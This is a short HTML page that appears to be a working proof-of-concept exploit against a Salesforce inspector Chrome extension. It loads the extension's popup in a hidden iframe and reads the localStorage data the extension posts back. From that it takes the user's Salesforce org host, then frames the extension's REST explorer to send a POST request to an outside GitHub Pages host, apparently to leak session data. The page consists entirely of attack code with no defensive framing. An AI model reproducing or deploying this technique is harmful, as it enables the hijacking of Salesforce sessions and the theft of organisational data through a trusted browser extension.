<!DOCTYPE html>
<html>
<head>
    <title>SFDC Inspector Reloaded</title>
    <style>
        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; }
        #endpoint { 
            margin-top: 20px;
            padding: 15px;
            background: #e3f2fd;
            border-radius: 4px;
        }
        iframe {
            width: 100%;
            height: 500px;
            margin-top: 20px;
            border: 1px solid #ddd;
        }
    </style>
</head>
<body>
    <div id="messages">Loading...</div>
    <div id="endpoint"></div>
    <script>
        const messagesDiv = document.getElementById('messages');
        const endpointDiv = document.getElementById('endpoint');
        
        window.addEventListener('message', function(event) {
            if (event.data.insextInitRequest) {
                messagesDiv.innerHTML = '<pre>Init Request: ' + JSON.stringify(event.data, null, 2) + '</pre>';
                
                const storage = event.data.iFrameLocalStorage;
                // Find first key that ends with _orgInstance
                const hostKey = Object.keys(storage).find(key => key.endsWith('_orgInstance'));
                
                if (hostKey) {
                    // Extract the host URL by removing _orgInstance
                    const hostUrl = hostKey.replace('_orgInstance', '');
                    
                    // Construct the full URL
                    const fullUrl = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/rest-explore.html?host=${hostUrl}&method=POST&endpoint=samanattar.github.io`;
                    
                    endpointDiv.innerHTML = `
                        <h3>Extracted Information:</h3>
                        <pre>Host URL: ${hostUrl}</pre>
                        <pre>Full Endpoint: ${fullUrl}</pre>
                        <iframe src="${fullUrl}"></iframe>
                    `;
                }
            }
        });

        // Initial iframe for getting localStorage data
        const initFrame = document.createElement('iframe');
        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
        initFrame.style.display = 'none';
        document.body.appendChild(initFrame);
    </script>
</body>
</html>
